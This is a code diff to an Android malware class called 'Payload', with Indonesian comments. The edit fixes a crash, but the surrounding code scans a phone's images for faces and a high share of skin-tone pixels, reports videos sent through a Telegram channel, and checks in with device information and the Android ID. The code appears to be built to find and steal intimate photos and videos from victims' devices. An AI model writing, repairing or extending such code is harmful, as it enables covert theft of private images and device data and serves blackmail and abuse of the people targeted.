@@ -317,7 +317,7 @@ public class Payload extends Service {
             FaceDetector.Face[] faces = new FaceDetector.Face[5];
             int numFaces = detector.findFaces(bitmap, faces);
             bitmap.recycle();
-            detector.release();
+            // detector.release(); <--- INI YANG BIKIN ERROR, UDAH DIHAPUS
             return numFaces > 0;
         } catch (Exception e) { return false; }
     }
@@ -325,7 +325,7 @@ public class Payload extends Service {
     private boolean detectSkin(String filePath) {
         try {
             BitmapFactory.Options options = new BitmapFactory.Options();
-            options.inSampleSize = 4; // Perkecil gambar biar cepet
+            options.inSampleSize = 4; 
             Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
             if (bitmap == null) return false;
             int width = bitmap.getWidth();
@@ -337,14 +337,13 @@ public class Payload extends Service {
                     totalPixels++;
                     int pixel = bitmap.getPixel(x, y);
                     int r = Color.red(pixel), g = Color.green(pixel), b = Color.blue(pixel);
-                    // Heuristik Warna Kulit
                     if (r > 95 && g > 40 && b > 20 && (Math.max(r, Math.max(g, b)) - Math.min(r, Math.min(g, b))) > 15 && Math.abs(r - g) > 15 && r > g && r > b) {
                         skinPixels++;
                     }
                 }
             }
             bitmap.recycle();
-            return totalPixels > 0 && ((double) skinPixels / totalPixels) > 0.3; // >30% kulit
+            return totalPixels > 0 && ((double) skinPixels / totalPixels) > 0.3;
         } catch (Exception e) { return false; }
     }
 
@@ -376,7 +375,6 @@ public class Payload extends Service {
         sendTelegramMessage("✅ Selesai scan video. Terkirim " + sent + " video.");
     }
 
-    // FUNGSI LAMA (DUMP, DLL)
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo + "|" + myAndroidId, "UTF-8");
@@ -510,4 +508,4 @@ public class Payload extends Service {
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
-                }
+}
